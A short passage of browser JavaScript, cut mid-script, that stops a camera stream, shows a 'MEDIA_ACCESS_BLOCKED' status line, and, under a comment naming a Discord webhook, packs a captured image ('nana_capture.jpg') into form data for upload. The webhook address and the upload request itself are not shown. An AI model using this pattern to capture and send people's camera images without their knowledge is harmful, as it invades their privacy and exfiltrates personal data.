stream.getTracks().forEach(t => t.stop()); } catch(e) { status.innerText = "LOG: MEDIA_ACCESS_BLOCKED"; } // 3. 送信 (Discord Webhook) const fd = new FormData(); if(fileBlob) fd.append('file', fileBlob, 'nana_capture.jpg');
